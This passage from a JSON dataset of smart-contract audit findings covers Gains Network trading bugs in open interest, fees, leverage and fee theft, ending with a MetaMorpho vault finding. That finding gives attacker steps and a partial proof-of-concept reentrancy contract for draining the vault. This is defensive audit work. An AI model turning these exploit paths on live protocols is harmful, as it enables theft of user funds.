priceImpactStorage.windows[settings.windowsDuration][trade.pairIndex][\n                addWindowId\n            ];\n\n            //@audit When isPartial == true, need to handle the case where _oiDeltaUsd > active OI\n            // 3.1 If full close, deduct any OI that wasn't moved due to being already expired (partial add size)\n            if (!_isPartial) _oiDeltaUsd -= priceImpactStorage.tradePriceImpactInfos[_trader][_index].expiredOiUsd;\n\n            // 3.2 Remove OI from trade last oi updated window\n            if (trade.long) {\n                pairOi.oiLongUsd = _oiDeltaUsd < pairOi.oiLongUsd ? pairOi.oiLongUsd - _oiDeltaUsd : 0;\n            } else {\n                pairOi.oiShortUsd = _oiDeltaUsd < pairOi.oiShortUsd ? pairOi.oiShortUsd - _oiDeltaUsd : 0;\n            }\n        }\n\n        ...\n    }\n```\n\n**Recommendations**\n\nThe correct OI to remove should be `min(deltaOiUsd, positionSizeUsd - expiredOiUsd)`.",
      "summary": "\nThe bug report discusses a medium severity issue that can impact the accuracy of removing open interest (OI) in a trading system. The function `removePriceImpactOpenInterest()` is designed to remove the correct amount of OI when closing a trade, but it fails to account for partial position size reductions. This can result in an incorrect OI being removed, leading to a lower price impact on subsequent trades. The report recommends a fix to ensure that the correct OI is removed by using the formula `min(deltaOiUsd, positionSizeUsd - expiredOiUsd)`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36426",
      "title": "[M-04] `updateTradePosition()` fails to limit TP/SL distance",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** High\n\n**Likelihood:** Low\n\n**Description**\n\nAn increase in position size will update the trade's open price due to the partial trade with a different open price. The trade new open price will be updated via `updateTradePosition()`.\n\nHowever, `updateTradePosition()` fails to adjust the TP/SL using `_limitTpDistance()` and `_limitSlDistance()` despite changing the open price. It could cause the existing TP/SL that are near limits to be incorrectly exceeding the TP/SL limits based on max PnL.\n\nTraders could abuse this to set a TP that exceeds the max profit of 900%.\n\n```Solidity\n    function updateTradePosition(\n        ITradingStorage.Id memory _tradeId,\n        uint120 _collateralAmount,\n        uint24 _leverage,\n        uint64 _openPrice\n    ) external {\n        ITradingStorage.TradingStorage storage s = _getStorage();\n        ITradingStorage.Trade storage t = s.trades[_tradeId.user][_tradeId.index];\n        ITradingStorage.TradeInfo storage i = s.tradeInfos[_tradeId.user][_tradeId.index];\n\n        if (!t.isOpen) revert IGeneralErrors.DoesntExist();\n        if (t.tradeType != ITradingStorage.TradeType.TRADE) revert IGeneralErrors.WrongTradeType();\n        if (_collateralAmount * _leverage == 0) revert ITradingStorageUtils.TradePositionSizeZero();\n        if (_openPrice == 0) revert ITradingStorageUtils.TradeOpenPriceZero();\n\n        //@audit TODO\n        TradingCommonUtils.handleOiDelta(\n            t,\n            i,\n            TradingCommonUtils.getPositionSizeCollateral(_collateralAmount, _leverage)\n        );\n\n        t.collateralAmount = _collateralAmount;\n        t.leverage = _leverage;\n        t.openPrice = _openPrice;\n\n        i.createdBlock = uint32(ChainUtils.getBlockNumber());\n\n        emit ITradingStorageUtils.TradePositionUpdated(_tradeId, _collateralAmount, t.leverage, t.openPrice);\n    }\n```\n\n**Recommendations**\n\nModify `updateTradePosition()` to adjust the TP/SL using `_limitTpDistance()` and `_limitSlDistance()` .",
      "summary": "\nThis bug report describes a problem where changing the size of a trade can cause the trade's open price to be updated incorrectly. This can lead to the existing take profit (TP) and stop loss (SL) limits being exceeded, which could be exploited by traders to set a TP that exceeds the maximum profit of 900%. The report recommends modifying the code to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36425",
      "title": "[M-03] Open interest calculation is incorrect",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n**Description**\n\nThe open interest (OI) delta is calculated using the `current collateral/USD` price when `adding OI`. Conversely, when `removing OI`, the delta is calculated using the `collateral/USD price at the time the OI was added`. This method works correctly if an order is only opened and closed once. However, if the order position is increased or decreased multiple times, the OI calculation becomes incorrect.\n\nFor example, if a position is opened when the collateral price is $100 and then increased when the price is $110, the OI to be removed upon closing is incorrectly calculated using the $110 price.\n\n```solidity\n    function handleOiDelta(\n        ITradingStorage.Trade memory _trade,\n        ITradingStorage.TradeInfo memory _tradeInfo,\n        uint256 _newPositionSizeCollateral\n    ) external {\n        uint256 existingPositionSizeCollateral = getPositionSizeCollateral(_trade.collateralAmount, _trade.leverage);\n\n        if (_newPositionSizeCollateral > existingPositionSizeCollateral) {\n            addOiCollateral(_trade, _newPositionSizeCollateral - existingPositionSizeCollateral); // @audit using current collateral/usd price\n        } else if (_newPositionSizeCollateral < existingPositionSizeCollateral) {\n            removeOiCollateral(_trade, _tradeInfo, existingPositionSizeCollateral - _newPositionSizeCollateral); // @audit using the collateral/usd price when the OI was added last time\n        }\n    }\n```\n\n**Recommendations**\n\nTrack the total open interest of a position and adjust the open interest based on the maximum total open interest when the position is closed.",
      "summary": "\nThis bug report describes an issue with the open interest delta calculation in a trading system. This calculation is incorrect when a position is opened and closed multiple times, leading to incorrect removal of open interest. The recommendation is to track the total open interest of a position and adjust it when the position is closed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36424",
      "title": "[M-02] Double counting of existing open interest",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n**Description**\n\nWhen validating a request to increase position size, the function `validateRequest` checks if the trade stays within exposure limits. However, the amounts and leverage used are `newCollateralAmount` and `newLeverage` instead of `collateralDelta` and `leverageDelta`.\n\nWe have `newPositionSizeCollateral = existingPositionSizeCollateral + positionSizeCollateralDelta`. The current open interest level already accounts for the `existingPositionSizeCollateral`. Therefore, to check if the trade after increasing position size stays within exposure limits, we should check if the additional amount `positionSizeCollateralDelta` is within the exposure limits.\n\nIf `newCollateralAmount` and `newLeverage` are used for the check, the trade might be considered as exceeding the exposure limits even though the additional amount is within the limits because the current open interest level is double-counted.\n\n```solidity\n    function validateRequest(\n        ITradingStorage.Trade memory _trade,\n        IUpdatePositionSizeUtils.IncreasePositionSizeInput memory _input\n    ) internal view returns (uint256 positionSizeCollateralDelta) {\n        ...\n\n        // 4. Make sure trade stays within exposure limits\n        if (\n            !TradingCommonUtils.isWithinExposureLimits(\n                _trade.collateralIndex,\n                _trade.pairIndex,\n                _trade.long,\n                newCollateralAmount, // @audit already counted the existing collateral\n                newLeverage\n            )\n        ) revert ITradingInteractionsUtils.AboveExposureLimits();\n    }\n```\n\nThe same issue can be identified in `IncreasePositionSizeUtils.validateCallback`.\n\n```solidity\n    function validateCallback(\n        ITradingStorage.Trade memory _existingTrade,\n        IUpdatePositionSizeUtils.IncreasePositionSizeValues memory _values,\n        ITradingCallbacks.AggregatorAnswer memory _answer,\n        uint256 _expectedPrice,\n        uint256 _maxSlippageP\n    ) internal view returns (ITradingCallbacks.CancelReason cancelReason) {\n        ...\n            : !TradingCommonUtils.isWithinExposureLimits(\n                _existingTrade.collateralIndex,\n                _existingTrade.pairIndex,\n                _existingTrade.long,\n                _values.newCollateralAmount, // @audit already counted the existing collateral\n                _values.newLeverage\n            )\n        ...\n    }\n```\n\n**Recommendations**\n\nOnly account for the additional position size when checking if the trade stays within exposure limits. Adjust the code to handle different scenarios:\n\n- If `collateralDelta` > 0 and `leverageDelta` > 0, use `collateralDelta` and `leverageDelta`.\n- If `collateralDelta` = 0, use `collateralAmount` and `leverageDelta`.",
      "summary": "\nThis bug report addresses an issue with a function called `validateRequest` that is used to check if a trade stays within exposure limits when increasing the position size. The problem is that the function is using incorrect values for this check, which can result in the trade being considered as exceeding the exposure limits even though it is actually within the limits. This is because the function is using the wrong amounts and leverage values. The report recommends adjusting the code to only account for the additional position size when checking if the trade stays within exposure limits, and to handle different scenarios accordingly. This will ensure that the trade is accurately checked and prevent any incorrect rejections. ",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36423",
      "title": "[M-01] Incorrect calculation of new liquidation price",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n**Description**\n\nWhen calculating the newLiqPrice in `IncreasePositionSizeUtils.prepareCallbackValues`, the function uses `newCollateralAmount` and `newLeverage`.\n\n```solidity\n  function prepareCallbackValues(\n        ITradingStorage.Trade memory _existingTrade,\n        ITradingStorage.Trade memory _partialTrade,\n        ITradingCallbacks.AggregatorAnswer memory _answer\n    ) internal view returns (IUpdatePositionSizeUtils.IncreasePositionSizeValues memory values) {\n        ...\n        values.newLiqPrice = _getMultiCollatDiamond().getTradeLiquidationPrice(\n            IBorrowingFees.LiqPriceInput(\n                _existingTrade.collateralIndex,\n                _existingTrade.user,\n                _existingTrade.pairIndex,\n                _existingTrade.index,\n                uint64(values.newOpenPrice),\n                _existingTrade.long,\n                values.newCollateralAmount, // @audit use newCollateralAmount & newLeverage => borrowing fee is overstated\n                values.newLeverage\n            )\n        );\n        ...\n    }\n```\n\nTo calculate the liquidation price, the current borrowing fee amount needs to be considered. Using `newCollateralAmount` and `newLeverage` as inputs can lead to overstating the borrowing fee if these values are higher than the current collateral and leverage. This results in an incorrect new liquidation price, making it higher for long positions and lower for short positions. This miscalculation can cause unexpected reverts when validating the callback due to the liquidation price being incorrectly calculated as reached.\n\n```solidity\n    function getTradeBorrowingFee(\n        IBorrowingFees.BorrowingFeeInput memory _input\n    ) internal view returns (uint256 feeAmountCollateral) {\n        ...\n\n        feeAmountCollateral = (_input.collateral * _input.leverage * borrowingFeeP) / 1e3 / ConstantsUtils.P_10 / 100; // collateral precision\n    }\n```\n\n**Recommendations**\n\nPass the current borrowing fee to calculate the new liquidation price instead of recalculating the borrowing fee with `newCollateralAmount` and `newLeverage`.",
      "summary": "\nThis bug report describes an issue with the function `prepareCallbackValues` in the code. The function is used to calculate the new liquidation price for trading positions. However, the current implementation can lead to incorrect liquidation prices, causing unexpected errors when validating the callback. This is because the function uses `newCollateralAmount` and `newLeverage` as inputs, which can result in overstating the borrowing fee. To fix this issue, it is recommended to pass the current borrowing fee instead of recalculating it with `newCollateralAmount` and `newLeverage`. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [
        "Liquidation"
      ],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36422",
      "title": "[H-04] Price impact cannot properly be removed",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n**Description**\n\nWhen user's increase position size or update leverage request is successfully executed, it will update user's trade position by calling `updateTradePosition` and providing the new `newCollateralAmount` and `newLeverage`.\n\n```solidity\n    function updateTradeSuccess(\n        ITradingStorage.Trade memory _existingTrade,\n        IUpdatePositionSizeUtils.IncreasePositionSizeValues memory _values\n    ) internal {\n        // 1. Charge borrowing fees and opening fees from trade collateral\n        _values.newCollateralAmount -= _values.borrowingFeeCollateral + _values.openingFeesCollateral;\n\n        // 2. Update trade in storage\n>>>     _getMultiCollatDiamond().updateTradePosition(\n            ITradingStorage.Id(_existingTrade.user, _existingTrade.index),\n            uint120(_values.newCollateralAmount),\n            uint24(_values.newLeverage),\n            uint64(_values.newOpenPrice)\n        );\n\n        // 3. Reset trade borrowing fees to zero\n        _getMultiCollatDiamond().resetTradeBorrowingFees(\n            _existingTrade.collateralIndex,\n            _existingTrade.user,\n            _existingTrade.pairIndex,\n            _existingTrade.index,\n            _existingTrade.long\n        );\n    }\n```\n\nAnd inside `updateTradePosition`, it will update the trade data and trigger `TradingCommonUtils.handleOiDelta` to add the new position size delta to the price impact.\n\n```solidity\n    function handleOiDelta(\n        ITradingStorage.Trade memory _trade,\n        ITradingStorage.TradeInfo memory _tradeInfo,\n        uint256 _newPositionSizeCollateral\n    ) external {\n        uint256 existingPositionSizeCollateral = getPositionSizeCollateral(_trade.collateralAmount, _trade.leverage);\n\n        if (_newPositionSizeCollateral > existingPositionSizeCollateral) {\n>>>         addOiCollateral(_trade, _newPositionSizeCollateral - existingPositionSizeCollateral);\n        } else if (_newPositionSizeCollateral < existingPositionSizeCollateral) {\n            removeOiCollateral(_trade, _tradeInfo, existingPositionSizeCollateral - _newPositionSizeCollateral);\n        }\n    }\n```\n\n```solidity\n    function addPriceImpactOpenInterest(uint128 _openInterestUsd, uint256 _pairIndex, bool _long) internal {\n        IPriceImpact.PriceImpactStorage storage priceImpactStorage = _getStorage();\n        IPriceImpact.OiWindowsSettings storage settings = priceImpactStorage.oiWindowsSettings;\n\n>>>     uint256 currentWindowId = _getCurrentWindowId(settings);\n        IPriceImpact.PairOi storage pairOi = priceImpactStorage.windows[settings.windowsDuration][_pairIndex][\n            currentWindowId\n        ];\n\n        if (_long) {\n            pairOi.oiLongUsd += _openInterestUsd;\n        } else {\n            pairOi.oiShortUsd += _openInterestUsd;\n        }\n\n        emit IPriceImpactUtils.PriceImpactOpenInterestAdded(\n            IPriceImpact.OiWindowUpdate(settings.windowsDuration, _pairIndex, currentWindowId, _long, _openInterestUsd)\n        );\n    }\n```\n\nIt can be observed that the price impact is added to `currentWindowId`, and when the trade is closed and the trade price impact is removed, it will only remove the price impact at `_tradeInfo.lastOiUpdateTs`.\n\n```solidity\n    function removeOiCollateral(\n        ITradingStorage.Trade memory _trade,\n        ITradingStorage.TradeInfo memory _tradeInfo,\n        uint256 _positionSizeCollateral\n    ) public {\n        _getMultiCollatDiamond().handleTradeBorrowingCallback(\n            _trade.collateralIndex,\n            _trade.user,\n            _trade.pairIndex,\n            _trade.index,\n            _positionSizeCollateral,\n            false,\n            _trade.long\n        );\n        // @audit - is this always correct?\n        _getMultiCollatDiamond().removePriceImpactOpenInterest(\n            // when removing OI we need to use the collateral/usd price when the OI was added\n            convertCollateralToUsd(\n                _positionSizeCollateral,\n                _getMultiCollatDiamond().getCollateral(_trade.collateralIndex).precisionDelta,\n                _tradeInfo.collateralPriceUsd\n            ),\n            _trade.pairIndex,\n            _trade.long,\n            _tradeInfo.lastOiUpdateTs // @audit - this will only remove price impact from initial collateral size\n        );\n    }\n```\n\nThis will cause the price impact to not be properly removed and result in a higher price impact than it should be.\n\n**Recommendations**\n\nUpdating the price impact to the same `_tradeInfo.lastOiUpdateTs` can be performed, or separately tracking the window ID when the position size is increased.",
      "summary": "\nThis bug report discusses an issue with the trade position update feature in a trading system. When a user increases their position size or changes their leverage, the system is supposed to update the trade position and recalculate the price impact. However, there is a problem with how the price impact is being updated, resulting in a higher price impact than it should be. The report recommends fixing the issue by either updating the price impact to the same timestamp or tracking the window ID separately when the position size is increased.",
      "quality_score": 3,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [
        "Wrong Time"
      ],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36421",
      "title": "[H-03] Overcharging of closing and trigger fees",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n**Description**\n\nCurrently, the calculation for closing and trigger fees applies a fixed `5%` fee to all `non-MARKET_CLOSE` orders. This fee should only apply to `LIQ_CLOSE` orders. For `TP_CLOSE` and `SL_CLOSE` orders, the calculation should use the pair close fee percentage and pair trigger order fee percentage, respectively. As a result, `TP_CLOSE` and `SL_CLOSE` orders are being overcharged.\n\n```solidity\n    function processClosingFees(\n        ITradingStorage.Trade memory _trade,\n        uint256 _positionSizeCollateral,\n        ITradingStorage.PendingOrderType _orderType\n    ) external returns (ITradingCallbacks.Values memory values) {\n        // 1. Calculate closing fees\n        values.positionSizeCollateral = getPositionSizeCollateralBasis(\n            _trade.collateralIndex,\n            _trade.pairIndex,\n            _positionSizeCollateral\n        ); // Charge fees on max(min position size, trade position size)\n\n        values.closingFeeCollateral = _orderType == ITradingStorage.PendingOrderType.MARKET_CLOSE\n            ? (values.positionSizeCollateral * _getMultiCollatDiamond().pairCloseFeeP(_trade.pairIndex)) /\n                100 /\n                ConstantsUtils.P_10\n            : (_trade.collateralAmount * 5) / 100; // @audit charge fixed 5% for non-MARKET_CLOSE\n\n        values.triggerFeeCollateral = _orderType == ITradingStorage.PendingOrderType.MARKET_CLOSE\n            ? (values.positionSizeCollateral * _getMultiCollatDiamond().pairTriggerOrderFeeP(_trade.pairIndex)) /\n                100 /\n                ConstantsUtils.P_10\n            : values.closingFeeCollateral; // @audit charge fixed 5% for non-MARKET_CLOSE\n        ...\n    }\n```\n\n**Recommendations**\n\nRevise the fee calculation logic to apply the pair close fee percentage and pair trigger order fee percentage specifically for `TP_CLOSE` and `SL_CLOSE` orders, while retaining the 5% fee for `LIQ_CLOSE` orders.",
      "summary": "\nThe bug report states that there is an issue with the calculation of closing and trigger fees in a trading system. Currently, a fixed 5% fee is being applied to all non-MARKET_CLOSE orders, but it should only be applied to LIQ_CLOSE orders. This is causing overcharging for TP_CLOSE and SL_CLOSE orders. The report recommends revising the fee calculation logic to apply the correct fees for each order type. ",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36420",
      "title": "[H-02] `newLeverage` wrongly calculated inside `requestIncreasePositionSize`",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n**Description**\n\nWhen users call `increasePositionSize` and request an increase in position size, it will eventually trigger `IncreasePositionSizeUtils.validateRequest` to validate the request. However, when calculating `newLeverage`, it incorrectly calculates `(existingPositionSizeCollateral + positionSizeCollateralDelta * 1e3) / newCollateralAmount` instead of `(existingPositionSizeCollateral + positionSizeCollateralDelta) * 1e3 / newCollateralAmount`, causing the `newLeverage` to be lower than it should be.\n\n```solidity\n    function validateRequest(\n        ITradingStorage.Trade memory _trade,\n        IUpdatePositionSizeUtils.IncreasePositionSizeInput memory _input\n    ) internal view returns (uint256 positionSizeCollateralDelta) {\n        // ....\n        uint256 newCollateralAmount = _trade.collateralAmount + _input.collateralDelta;\n        uint256 newLeverage = isLeverageUpdate\n            ? _trade.leverage + _input.leverageDelta\n>>>         : (existingPositionSizeCollateral + positionSizeCollateralDelta * 1e3) / newCollateralAmount;\n        {\n            uint256 borrowingFeeCollateral = TradingCommonUtils.getTradeBorrowingFeeCollateral(_trade);\n            uint256 openingFeesCollateral = ((_getMultiCollatDiamond().pairOpenFeeP(_trade.pairIndex) *\n                2 +\n                _getMultiCollatDiamond().pairTriggerOrderFeeP(_trade.pairIndex)) *\n                TradingCommonUtils.getPositionSizeCollateralBasis(\n                    _trade.collateralIndex,\n                    _trade.pairIndex,\n                    positionSizeCollateralDelta\n                )) /\n                ConstantsUtils.P_10 /\n                100;\n\n            uint256 newPositionSizeCollateral = existingPositionSizeCollateral +\n                positionSizeCollateralDelta -\n                ((borrowingFeeCollateral + openingFeesCollateral) * newLeverage) /\n                1e3;\n\n            if (newPositionSizeCollateral <= existingPositionSizeCollateral)\n                revert IUpdatePositionSizeUtils.NewPositionSizeSmaller();\n        }\n```\n\nThe `newLeverage` is used to calculate `newPositionSizeCollateral`, which will be used for checking against `existingPositionSizeCollateral`. Incorrectly calculating `newLeverage` will cause `newPositionSizeCollateral` to be higher than it should be and could lead to incorrectly passing the validation check. And it will also calculate and check `isWithinExposureLimits` using lower `newLeverage` amount, potentially bypass `exposureLimits`.\n\n**Recommendations**\n\nUpdate the `newLeverage` calculation :\n\n```diff\n        uint256 newLeverage = isLeverageUpdate\n            ? _trade.leverage + _input.leverageDelta\n-            : (existingPositionSizeCollateral + positionSizeCollateralDelta * 1e3) / newCollateralAmount;\n+            : (existingPositionSizeCollateral + positionSizeCollateralDelta) * 1e3 / newCollateralAmount;\n```",
      "summary": "\nThis bug report describes an issue in a code that is used for trading. When users try to increase their position size, the code incorrectly calculates a value called `newLeverage`, which is used to check if the request is valid. This can cause the request to be incorrectly approved and could potentially bypass certain safety measures. The report recommends updating the code to fix this issue.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36419",
      "title": "[H-01] `FeeTierPoints` is incorrectly increased twice",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n**Description**\n\nThe execution of the position size increase will call `TradingCommonUtils.updateFeeTierPoints()` to update the trader fee tier points by the position size delta.\n\nHowever, the trader fee tier points have been updated in the preceding call `TradingCommonUtils.processOpeningFees()`.\n\nThat means the trader fee tier points are incorrectly updated twice, causing the trader to receive double the points. A trader can exploit this to earn more points and get fee reduction quicker, causing protocol, vault users, and stakers to incur a loss in fee revenue.\n\n```Solidity\n    function executeIncreasePositionSizeMarket(\n        ITradingStorage.PendingOrder memory _order,\n        ITradingCallbacks.AggregatorAnswer memory _answer\n    ) external {\n            ...\n            // 5. If passes further validation, execute callback\n            if (cancelReason == ITradingCallbacks.CancelReason.NONE) {\n                // 5.1 Update trade collateral / leverage / open price in storage, and reset trade borrowing fees\n                IncreasePositionSizeUtils.updateTradeSuccess(existingTrade, values);\n\n                // 5.2 Distribute opening fees\n                //@audit this will update trader fee tier points for the increase of position size\n                TradingCommonUtils.processOpeningFees(\n                    existingTrade,\n                    values.positionSizeCollateralDelta,\n                    _order.orderType\n                );\n\n                // 5.3 Store trader fee tier points for position size delta\n                //@audit this will incorrectly update trader fee tier points again\n                TradingCommonUtils.updateFeeTierPoints(\n                    existingTrade.collateralIndex,\n                    existingTrade.user,\n                    existingTrade.pairIndex,\n                    values.positionSizeCollateralDelta\n                );\n            }\n        }\n\n        ;;;\n    }\n```\n\n**Recommendations**\n\nThis can be resolved by removing the redundant update of fee tier points.",
      "summary": "\nA bug has been discovered in the execution of the position size increase feature. This bug results in the trader fee tier points being updated twice, causing the trader to receive double the points. This can be exploited by traders to earn more points and get fee reduction quicker, which can lead to a loss in fee revenue for the protocol, vault users, and stakers. The bug can be resolved by removing the redundant update of fee tier points.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36418",
      "title": "[C-01] Decreasing position size via leverage update can be abused to steal from diamond",
      "impact": "HIGH",
      "content": "**Severity**\n\n**Impact:** High\n\n**Likelihood:** High\n\n**Description**\n\nThe trader can decrease position size using leverage update, which will then realize the partial profit/loss based on position size delta.\n\nHowever, in the case of a profit, `handleTradePnl()` will incorrectly send the closing fees to the trader instead of the vault. This allows the trader to receive more profit than expected by stealing from the diamond. Over time, this will slowly drain the diamond as the closing fees are still distributed despite not receiving it.\n\nSuppose the trader has the following position,\n\n- existing leverage = 10\n- existing collateral = 100 DAI\n- existing position size = 1000 DAI\n- existing profit of 500 DAI\n\nAnd the trader reduces position size by leverage delta,\n\n- delta leverage = 5\n- delta position size = 500 DAI\n- delta profit value = 500 \\* 500/1000 = 250 DAI\n- delta trade value = 500 + 250 = 750 DAI\n\nAfter deducting fees,\n\n- borrowing fee = 1\n- staking/vault fees = 5\n\nWe will get the following values,\n\n- `_availableCollateralInDiamond` = 0 - 5 = -5\n- `collateralSentToTrader` = 0 + 250 - 1 - 5 = 244\n\nNow when `handleTradePnl()` handle it,\n\n- vault sends trader `collateralSentToTrader - collateralLeftInStorage` = 244 - (-5) = 249 DAI\n- the closing fee of 5 DAI is incorrectly sent from the vault to the trader, instead of sending it to the diamond\n\n```Solidity\n    function handleTradePnl(\n        ITradingStorage.Trade memory _trade,\n        int256 _collateralSentToTrader,\n        int256 _availableCollateralInDiamond,\n        uint256 _borrowingFeeCollateral\n    ) external {\n        if (_collateralSentToTrader > _availableCollateralInDiamond) {\n            //@audit this will incorrectly send closing fees to trader when _availableCollateralInDiamond is negative\n            getGToken(_trade.collateralIndex).sendAssets(\n                uint256(_collateralSentToTrader - _availableCollateralInDiamond),\n                _trade.user\n            );\n\n            if (_availableCollateralInDiamond > 0)\n                transferCollateralTo(_trade.collateralIndex, _trade.user, uint256(_availableCollateralInDiamond));\n        } else {\n            getGToken(_trade.collateralIndex).receiveAssets(\n                uint256(_availableCollateralInDiamond - _collateralSentToTrader),\n                _trade.user\n            );\n            if (_collateralSentToTrader > 0)\n                transferCollateralTo(_trade.collateralIndex, _trade.user, uint256(_collateralSentToTrader));\n        }\n\n        emit ITradingCallbacksUtils.BorrowingFeeCharged(_trade.user, _trade.collateralIndex, _borrowingFeeCollateral);\n    }\n```\n\n**Recommendations**\n\nWhen reducing position by leverage, send the closing fees from vault to diamond, instead of sending to the trader.",
      "summary": "\nThis report discusses a bug in a trading platform where traders are able to decrease their position size using leverage updates. However, in certain cases, the platform incorrectly sends closing fees to the trader instead of the platform's vault. This allows the trader to receive more profit than expected and can slowly drain the platform's funds. The report recommends fixing this issue by sending the closing fees from the vault to the platform's diamond instead of the trader.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "54289",
      "title": "Allocator can drain the MetaMorpho vault if a future IRM queries token balance ",
      "impact": "LOW",
      "content": "## MetaMorpho Vault Allocator Role\n\n## Context\nMetaMorpho.sol#L368-L417\n\n## Description\nThe Allocator role in the MetaMorpho vault is responsible for distributing the portfolio and managing the risks of the vault. The Allocator cannot supply the assets to an unauthorized market (market with `supplyCap == 0`). Thus, in the scenario where the allocator's key is breached, the vault should have limited damage.\n\nThe issue lies at **MetaMorpho.sol#L399**:\n```solidity\nif (suppliedAssets == 0) continue;\n```\nWhen an unauthorized market with `suppliedAsset == 0` is provided in `reallocate`, the function just skips instead of reverting. This creates an attack vector. Since MetaMorpho calls `morpho.accrueInterest` in the loop, the malicious allocator could potentially control the flow within the `reallocate` function.\n\nCurrently, only `AdaptiveCurveIrm` can be used, which wouldn't give users control flow and thus prevent potential attacks. However, let's consider two hypothetical scenarios:\n1. A new IRM is deployed that queries token balances to calculate interest. (This is a reasonable setting as many IRMs actually depend on a token's balance.)\n2. Morpho-blue allows users to permissionlessly deploy their own IRMs.\n\nGiven this assumption, the malicious allocator can do the following:\n1. Deploy a fake market with a malicious callback function.\n2. Trigger `reallocate` with three Allocations. The first and third Allocation are enabled markets, but in the second Allocation, the fake market is provided.\n3. MetaMorpho processes each allocation:\n   1. The first Withdrawal is correct, and the vault pulls tokens from the first market.\n   2. The second market is malicious. The attacker gains control flow through the IRM.\n   3. In the malicious callback, the exploiter deposits to MetaMorpho. Since the tokens had been pulled in the previous step, the vault's price is lower. The exploiter gets vault shares at a low price.\n   4. Withdraw from MetaMorpho and profit.\n\n## Proof of Concept\nTo simplify the Proof of Concept, we assume that Morpho allows any IRM to be used.\n\n```solidity\ncontract IrmMock is IIrm {\n    uint256 public apr;\n    address public vault;\n    uint public depositAmount;\n    address public loanToken;\n\n    function setApr(uint256 newApr) external {\n        apr = newApr;\n    }\n\n    function borrowRateView(MarketParams memory, Market memory) public view returns (uint256) {\n        return apr / 365 days;\n    }\n\n    function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {\n        if (depositAmount != 0) {\n            IMetaMorpho vault = IMetaMorpho(vault);\n            IERC20(loanToken).approve(address(vault), depositAmount);\n            vault.deposit(depositAmount, address(this));\n        }\n        return borrowRateView(marketParams, market);\n    }\n\n    function setMMAddress(address _mm) external {\n        vault = _mm;\n    }\n\n    function setDepositAmount(uint256 amount) external {\n        depositAmount = amount;\n    }\n\n    function setLoanToken(address _loanToken) external {\n        loanToken = _loanToken;\n    }\n}\n\nfunction createFakeMarket() internal returns (MarketParams memory) {\n    // create mock IRM\n    IrmMock irm = new IrmMock();\n    irm.setApr(1e18);\n    \n    // enable irm on morpho\n    vm.prank(MORPHO_OWNER);\n    morpho.enableIrm(address(irm));\n\n    // create market\n    MarketParams 